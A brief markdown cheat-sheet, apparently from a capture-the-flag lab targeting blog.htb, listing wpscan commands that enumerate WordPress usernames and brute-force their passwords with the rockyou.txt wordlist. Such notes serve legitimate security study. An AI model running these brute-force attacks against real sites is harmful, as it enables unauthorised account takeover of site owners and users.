-- -
### Enumerate usernames
bruteforce IDs to get valid usernames
```bash
wpscan --url http://blog.htb -e u
```
### Bruteforce accounts
```bash
# bruteforce with all found valid usernames
wpscan --url http://blog.htb --passwords rockyou.txt

# bruteforce specific username
wpscan --url http://blog.htb --passwords rockyou.txt --usernames j@m3s
```